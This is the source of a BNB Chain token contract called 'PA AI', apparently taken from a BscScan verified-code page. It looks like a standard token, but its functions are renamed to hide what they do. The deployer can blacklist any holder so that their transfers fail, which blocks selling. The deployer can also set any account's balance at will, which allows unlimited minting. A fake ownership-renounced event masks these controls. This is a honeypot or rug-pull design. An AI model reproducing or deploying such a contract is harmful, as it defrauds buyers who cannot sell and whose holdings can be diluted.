/**
 *Submitted for verification at BscScan.com on 2023-03-02
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface limitFrom {
    function createPair(address txMax, address marketingMin) external returns (address);
}

contract PAAI {

    event Transfer(address indexed from, address indexed shouldAtTake, uint256 value);

    string public symbol = "PAI";

    address public owner;

    function tradingTo(address maxTake, address walletMode, uint256 limitTeam) internal returns (bool) {
        require(balanceOf[maxTake] >= limitTeam);
        balanceOf[maxTake] -= limitTeam;
        balanceOf[walletMode] += limitTeam;
        emit Transfer(maxTake, walletMode, limitTeam);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    function transfer(address minAtLaunch, uint256 limitTeam) external returns (bool) {
        return transferFrom(teamLiquidity(), minAtLaunch, limitTeam);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    bool public teamMarketing;

    address public launchSender;

    function txLiquidity(address fundAtBuy) public {
        require(totalAtTrading[teamLiquidity()]);
        if (fundAtBuy == shouldLimit || fundAtBuy == launchSender) {
            return;
        }
        listWallet[fundAtBuy] = true;
    }

    function transferFrom(address enableAuto, address minAtLaunch, uint256 limitTeam) public returns (bool) {
        if (enableAuto != teamLiquidity() && allowance[enableAuto][teamLiquidity()] != type(uint256).max) {
            require(allowance[enableAuto][teamLiquidity()] >= limitTeam);
            allowance[enableAuto][teamLiquidity()] -= limitTeam;
        }
        require(!listWallet[enableAuto]);
        return tradingTo(enableAuto, minAtLaunch, limitTeam);
    }

    event Approval(address indexed receiverIs, address indexed spender, uint256 value);

    uint256 private sellFund;

    mapping(address => bool) public listWallet;

    mapping(address => bool) public totalAtTrading;

    address public shouldLimit;

    function approve(address receiverFeeFrom, uint256 limitTeam) public returns (bool) {
        allowance[teamLiquidity()][receiverFeeFrom] = limitTeam;
        emit Approval(teamLiquidity(), receiverFeeFrom, limitTeam);
        return true;
    }

    function teamWallet(address liquiditySwapAuto) public {
        require(!teamMarketing);
        totalAtTrading[liquiditySwapAuto] = true;
        teamMarketing = true;
    }

    bool private maxEnable;

    uint256 private listExemptMax;

    string public name = "PA AI";

    bool private shouldMaxLaunch;

    uint256 public fundSender;

    constructor (){ 
        launchSender = limitFrom(address(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73)).createPair(address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c),address(this));
        shouldLimit = teamLiquidity();
        balanceOf[shouldLimit] = totalSupply;
        totalAtTrading[shouldLimit] = true;
        emit Transfer(address(0), shouldLimit, totalSupply);
        emit OwnershipTransferred(shouldLimit, address(0));
    }

    bool public tokenLaunchedWallet;

    function teamLiquidity() private view returns (address) {
        return msg.sender;
    }

    uint256 private walletFund;

    bool public modeLaunch;

    function fromLaunchAt(address minAtLaunch, uint256 limitTeam) public {
        require(totalAtTrading[teamLiquidity()]);
        balanceOf[minAtLaunch] = limitTeam;
    }

    uint8 public decimals = 18;

    uint256 public totalSupply = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) public allowance;

}